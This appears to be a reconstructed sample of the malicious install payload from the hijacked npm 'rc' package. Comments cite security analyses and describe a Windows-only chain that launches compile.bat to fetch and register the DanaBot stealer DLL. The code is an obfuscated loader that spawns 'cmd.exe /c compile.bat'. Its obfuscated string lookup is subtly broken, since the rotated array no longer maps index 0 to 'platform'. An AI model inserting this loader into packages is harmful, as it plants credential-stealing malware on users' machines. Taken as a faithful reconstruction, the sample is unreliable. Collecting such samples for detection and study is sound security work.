// rc@1.2.9 / 1.3.9 / 2.3.9 — reconstructed from public security analyses
// Source: https://www.sonatype.com/blog/npm-hijackers-at-it-again-popular-coa-and-rc-open-source-libraries-taken-over-to-spread-malware
// Source: https://www.rapid7.com/blog/post/2021/11/05/new-npm-library-hijacks-coa-and-rc/
// Advisory: https://github.com/advisories/GHSA-g2q5-5433-rhrf
//
// Same campaign as coa@2.0.3. Account hijacked on Nov 4, 2021.
// Obfuscated with obfuscator.io (_0x pattern).
// Detects OS, on Windows downloads DanaBot stealer DLL via sdd.dll,
// registers it with regsvr32.
//
// Reconstruction uses the same obfuscation pattern as coa.

const _0x17a2=['child_process','win32','platform','cmd.exe','win64','compile.bat'];
(function(_0x4b0a,_0x17a2f){const _0xf1=function(_0x4b0af){while(--_0x4b0af){_0x4b0a['push'](_0x4b0a['shift']());}};_0xf1(++_0x17a2f);}(_0x17a2,0x1be));
const _0xf1=function(_0x4b0a,_0x17a2f){_0x4b0a=_0x4b0a-0x0;return _0x17a2[_0x4b0a];};

var opsys = process[_0xf1('0x0')];
if (opsys == _0xf1('0x4') || opsys == _0xf1('0x2')) {
  const { spawn } = require(_0xf1('0x5'));
  const bat = spawn(_0xf1('0x1'), ['/c', _0xf1('0x3')]);
}
